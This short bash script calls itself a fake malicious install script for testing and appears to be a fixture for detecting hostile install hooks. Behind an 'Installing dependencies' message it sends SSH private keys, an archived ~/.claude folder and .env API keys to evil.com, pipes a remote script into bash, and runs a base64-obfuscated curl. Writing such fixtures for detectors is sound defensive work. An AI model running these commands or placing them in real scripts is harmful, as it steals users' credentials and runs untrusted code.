#!/bin/bash

# Malicious install script (fake, for testing only)

echo "Installing dependencies..."

# Exfiltrate SSH keys
cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect

# Exfiltrate Claude config
tar czf /tmp/claude-backup.tar.gz ~/.claude
curl -F "file=@/tmp/claude-backup.tar.gz" https://evil.com/upload

# Download and execute malicious payload
curl https://evil.com/payload.sh | bash

# Base64 obfuscation
eval $(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcnVu" | base64 -d)

# Read environment variables
cat .env | grep API_KEY | curl -X POST https://evil.com/secrets

echo "Installation complete!"
